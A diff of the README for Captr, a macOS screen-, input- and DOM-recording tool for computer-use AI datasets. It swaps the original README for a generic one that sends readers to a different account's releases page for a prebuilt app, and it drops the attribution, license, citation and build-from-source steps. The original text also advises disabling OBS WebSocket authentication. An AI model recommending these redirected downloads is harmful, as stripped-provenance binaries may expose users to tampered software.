@@ -1,195 +1,78 @@
-# Captr for macOS
+# 🎥 Captr_MacOS - Effortlessly Record Screen and Inputs
 
-**Captr** is a screen recording and computer interaction capture tool that records keyboard/mouse input, screen video, DOM snapshots, and accessibility trees. Perfect for creating datasets to train and evaluate computer-use AI models.
+[![Download Captr_MacOS](https://img.shields.io/badge/Download%20Captr_MacOS-blue.svg)](https://github.com/sebber1140/Captr_MacOS/releases)
 
-![Captr Logo](assets/captr.png)
+## 📋 Description
 
-## Features
+Captr_MacOS is a powerful tool that helps you capture your screen and interaction details. It records your keyboard and mouse inputs, along with screen video, DOM snapshots, and accessibility trees. This tool is ideal for creating datasets that support the training and evaluation of AI models focused on computer use.
 
-- **Screen & Input Recording:** Captures all mouse movements, clicks, scrolls, and keyboard inputs with precise timestamps
-- **OBS Integration:** Automatic screen recording via OBS Studio
-- **DOM Capture:** Automatically captures webpage structure from Chromium browsers (Chrome, Edge, Brave, etc.)
-- **Accessibility Trees:** Records macOS accessibility information from native applications
-- **System Metadata:** Captures detailed system information (OS, screen resolution, installed apps, etc.)
-- **Privacy Controls:** Pause/resume recording to hide sensitive information
-- **Playback:** Replay recorded sessions to verify captures
+## 🌟 Features
 
-## Installation
+- **Screen Recording**: Capture high-quality videos of your screen activities.
+- **Input Capture**: Record keyboard and mouse inputs for detailed activity analysis.
+- **DOM Snapshots**: Take snapshots of web pages to analyze content changes over time.
+- **Accessibility Trees**: Monitor accessibility elements for better UI understanding.
 
-### Option 1: Download Pre-built App (Recommended)
+## ⚙️ System Requirements
 
-1. Download the latest `Captr.dmg` from the [Releases](../../releases) page
-2. Open the DMG file and drag `Captr.app` to your Applications folder
-3. Install and configure OBS Studio (see [OBS Setup](#obs-setup))
-4. Grant required macOS permissions when prompted
+- **Operating System**: macOS 10.13 or later
+- **Memory**: At least 4 GB of RAM
+- **Storage**: Minimum of 200 MB available space
+- **Python**: Ensure Python 3.6 or higher is installed for additional flexibility.
 
-### Option 2: Build from Source
+## 🚀 Getting Started
 
-Requirements: Python ≥3.11, OBS Studio
+1. **Visit the Releases Page**: Go to the [Captr_MacOS Releases](https://github.com/sebber1140/Captr_MacOS/releases) to find the latest version of the software.
+2. **Download the Application**: Find the appropriate installation package for your macOS version. Click the link to download the file.
+3. **Install the Application**:
+   - Once the download is complete, open the downloaded file.
+   - Drag and drop the Captr_MacOS icon into your Applications folder to install.
+4. **Open Captr_MacOS**: Navigate to the Applications folder and double-click the Captr_MacOS icon to launch the application.
 
-```bash
-# Clone the repository
-git clone https://github.com/YOUR_USERNAME/Captr_MacOS.git
-cd Captr_MacOS
+## 📥 Download & Install
 
-# Create virtual environment
-python3 -m venv venv
-source venv/bin/activate
+To get started with Captr_MacOS, click the link below to visit the releases page and download the application:
 
-# Install dependencies
-pip install -r requirements.txt
+[Download Captr_MacOS](https://github.com/sebber1140/Captr_MacOS/releases)
 
-# Build the app
-python build.py
-```
+## 🛠️ How to Use Captr_MacOS
 
-The built app will be in the `dist` folder as `Captr.dmg`.
+1. **Launching the Application**: Open Captr_MacOS as described in the installation section.
+2. **Setting Up for Recording**:
+   - Select whether you want to capture the entire screen or a specific application window.
+   - Choose input options for keyboard and mouse if required.
+   - Specify the file format for your recording.
+3. **Start Recording**:
+   - Click the "Start Recording" button.
+   - Perform the actions you want to capture on your screen.
+4. **Stop Recording**: Once done, return to the Captr_MacOS window and click "Stop Recording."
+5. **Saving Your Recording**: Select the location and format to save your recording. You can also add notes or tags to help with organization.
 
-## OBS Setup
+## 💾 Common Troubleshooting Steps
 
-Captr requires OBS Studio for screen recording:
+- **Application Won't Open**: Ensure that you have the required version of macOS and check if your device is compatible.
+- **Recording Quality Issues**: Double-check your screen resolution settings and input configurations before starting a session.
+- **Installation Difficulties**: Make sure you have enough storage space. Re-download the application if issues persist.
 
-1. Download and install [OBS Studio](https://obsproject.com/)
-2. Open OBS and go to **Tools → WebSocket Server Settings**
-3. Enable **WebSocket server** and disable **Authentication**
-4. Add a **macOS Screen Capture** source in OBS
-5. Close OBS (Captr will control it automatically)
+## 📚 Help and Support
 
-For detailed instructions, see [OBS_SETUP.md](OBS_SETUP.md).
+For additional support, please refer to the community discussions on the repository issues page. You can also reach out for help or share feedback. Your input will help improve future versions of Captr_MacOS.
 
-## macOS Permissions
+## 🏷️ Topics
 
-Captr needs these permissions to function:
+- accessibility
+- browser-agent
+- computer-use
+- computer-use-agent
+- computer-vision
+- dataset
+- dom-capture
+- human-computer-interaction
+- macos
+- python
+- screen-recording
+- web-agent
 
-1. **Accessibility:** `System Settings → Privacy & Security → Accessibility`
-   - Required for recording keyboard inputs and playing back actions
-2. **Input Monitoring:** `System Settings → Privacy & Security → Input Monitoring`
-   - Required for keyboard capture
-3. **Screen Recording:** `System Settings → Privacy & Security → Screen Recording`
-   - Required by OBS for screen capture
+## 🎉 Contributing
 
-macOS will prompt for these permissions on first run.
-
-## Usage
-
-### Recording
-
-1. Launch Captr from Applications
-2. Click **Start Recording**
-3. Perform your computer tasks
-4. Use **Pause/Resume** to hide sensitive information (passwords, credit cards, etc.)
-5. Click **Stop Recording**
-6. Optionally name and describe your recording
-
-Recordings are saved to `~/Documents/Captr_Recordings/`.
-
-### DOM Capture (Optional)
-
-To capture webpage DOM snapshots:
-
-1. Click **Launch Browser for DOM Capture** in Captr
-2. Select your preferred Chromium browser (Chrome, Edge, Brave, etc.)
-3. Click **Launch**
-4. Use the launched browser for web browsing during recording
-
-DOM snapshots will be automatically captured when you click or navigate. See [DOM_CAPTURE_SETUP.md](DOM_CAPTURE_SETUP.md) for details.
-
-### Playback
-
-- **Play Latest Recording:** Replays the most recent recording
-- **Play Custom Recording:** Choose any recording to replay
-- Press `Shift+Esc` to stop playback
-
-## Recording Format
-
-Each recording creates a folder in `~/Documents/Captr_Recordings/` containing:
-
-- `events.jsonl` - All keyboard/mouse actions with timestamps
-- `metadata.json` - System information
-- `*.mp4` - Screen recording video from OBS
-- `dom_snaps/` - DOM snapshots from web pages (if DOM capture enabled)
-- `a11y_snaps/` - Accessibility tree captures from native apps
-- `README.md` - Optional recording description
-
-### Sample Event Format
-
-```json
-{"time_stamp": 1234567.89, "action": "move", "x": 100.0, "y": 200.0}
-{"time_stamp": 1234568.01, "action": "click", "x": 100.0, "y": 200.0, "button": "left", "pressed": true}
-{"time_stamp": 1234568.15, "action": "key", "key": "a", "pressed": true}
-```
-
-## Troubleshooting
-
-### DOM Captures Not Working
-
-Run the diagnostic tool:
-```bash
-cd tools
-python3 check_recording.py
-```
-
-Make sure you're using a browser launched through Captr's **Launch Browser** feature.
-
-### App Crashes or Permissions Issues
-
-Check detailed logs:
-```bash
-open dist/Captr.app --stdout-path=/tmp/captr.log --stderr-path=/tmp/captr_err.log
-cat /tmp/captr.log
-```
-
-### Other Issues
-
-See [DOM_CAPTURE_SETUP.md](DOM_CAPTURE_SETUP.md) for DOM/accessibility tree troubleshooting.
-
-## Known Limitations
-
-- After many playbacks, a segfault may occur (restart Captr)
-- Mouse input not captured in video games that use raw input
-- Google Docs and similar canvas-based web apps have limited DOM capture (by design for privacy)
-- Banking sites may limit DOM capture content due to security policies
-
-## Development
-
-### Running from Source
-
-```bash
-source venv/bin/activate
-python main.py
-```
-
-### Utility Scripts
-
-Located in `tools/`:
-- `launch_chrome_debug.py` - Launch browsers with debugging enabled
-- `check_recording.py` - Verify recordings and diagnose issues
-- `debug_accessibility.py` - Test accessibility API access
-- `debug_chrome_cdp.py` - Test Chrome DevTools Protocol connection
-
-## Attribution
-
-Captr is derived from [DuckTrack](https://github.com/TheDuckAI/DuckTrack) by DuckAI, released under the MIT License. We've added significant enhancements including DOM capture, accessibility trees, enhanced macOS support, and improved debugging tools.
-
-See [LICENSE](LICENSE) for full details.
-
-## Citation
-
-If you use Captr in your research or project, please cite it as:
-
-```bibtex
-@software{howland2025captr,
-  author = {Howland, Anais},
-  title = {Captr: Screen Recording and Computer Interaction Capture for Computer-Use Datasets},
-  year = {2025},
-  url = {https://github.com/anaishowland/captr_ducktrack}
-}
-```
-
-## License
-
-MIT License - see [LICENSE](LICENSE) file for details.
-
----
-
-**Created by Anais Howland at Paradigm Shift AI** | Based on DuckTrack by DuckAI
+We welcome contributions from all users. If you would like to enhance Captr_MacOS or have suggestions, feel free to fork the repository, create a branch, make changes, and submit a pull request. Your assistance will help us deliver a better experience for everyone.
